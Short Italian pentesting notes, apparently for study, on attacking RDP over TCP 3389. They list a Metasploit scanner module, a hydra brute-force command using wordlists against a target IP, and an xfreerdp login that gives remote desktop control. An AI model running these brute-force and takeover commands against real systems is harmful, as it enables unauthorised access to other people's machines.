- **RDP** è un protocollo di accesso remoto sviluppato da Microsoft.
- Sfruttando questa vulnerabilità otterremo il controllo da remoto del desktop del target
- Usa la porta **TCP 3389**.
- Richiede un account utente legittimo e la password in chiaro.
- Si può eseguire un attacco brute-force per ottenere credenziali legittime.

Se dalle nostre scan non si trova **nessuna porta** con servizio **RDP** è possibile **verificare ulteriormente** **con** il **modulo** di **Metasploit**

EXPLOIT

1. **auxiliary/scanner/rdp/rdp_scanner** verifica se la porta di destinazione settata è presente rdp come servizio
2. **hydra -L** /usr/share/metasploit-framework/data/wordlists/common_users.txt **-P** /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt **rdp://IP_TARGET -s NUMERO_PORTA**
3. **xfreerdp /u:USERNAME /p:PASSWORD /v:IP_ADDRESS:PORTA** tool che attiva rdp per ottenere controllo del PC Target
